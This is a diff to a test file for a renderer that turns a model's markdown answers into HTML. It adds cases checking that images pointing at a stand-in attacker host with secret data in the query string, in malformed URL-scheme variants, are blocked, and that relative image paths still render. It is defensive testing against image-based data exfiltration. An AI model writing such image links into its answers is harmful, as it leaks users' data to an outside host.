@@ -144,11 +144,19 @@ describe('an answer, drawn as a note is', () => {
     'https:evil.example/p.png?d=secret',
     'HTTPS:/evil.example/p.png?d=secret',
     '//evil.example/p.png?d=secret',
+    'http:evil.example/p.png?d=secret',
+    'http:/evil.example/p.png?d=secret',
+    'HTTP:evil.example/p.png?d=secret',
   ])('a picture at %s, which the page reads as another host, is held too', (src) => {
     const held = answerHtml(`![x](${src})`)
     expect(held).not.toContain('<img')
     expect(held).toContain('class="picture-held"')
     expect(held).toContain('<span>x</span>')
+  })
+
+  test('a picture named from the note it answers about is still drawn', () => {
+    expect(answerHtml('![a](pics/a.png)')).toContain('<img')
+    expect(answerHtml('![a](/pics/a.png)')).toContain('<img')
   })
 
   test('raw HTML the model wrote is its characters, and frames are taken out', () => {
